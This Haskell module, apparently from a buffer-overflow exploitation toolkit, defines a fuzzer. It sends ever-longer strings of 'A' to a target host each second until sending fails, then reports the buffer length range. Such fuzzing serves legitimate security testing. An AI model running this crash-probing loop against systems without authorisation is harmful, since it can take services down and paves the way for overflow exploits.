module Overflow.Fuzz
( runFuzzer
) where

import Overflow
import Control.Concurrent
import Data.Text          (Text)
import Text.Printf

-- |...
runFuzzer :: Host -> Int -> (Maybe Text, Maybe Text) -> IO ()
runFuzzer h i a = runFuzzer' h i i a True >>= handleOutput 
    where
        handleOutput c
            |    c == i = putStrLn "Error: An error occurred sending payload to target."
            | otherwise = printf "Done! Length of buffer is in the range (%d, %d].\n" (c - i) c

-- ...
runFuzzer' :: Host -> Int -> Int -> (Maybe Text, Maybe Text) -> Bool -> IO Int
runFuzzer' _ c i _ False = pure (c - i)
runFuzzer'  h c i a True = do
        result <- sendPayload h payload 
        printf "    ───> Sending %d-byte payload to target...\n" c
        threadDelay 1000000 -- 1s
        runFuzzer' h (c + i) i a result
    where
        payload = createPayload (replicate c 'A') a
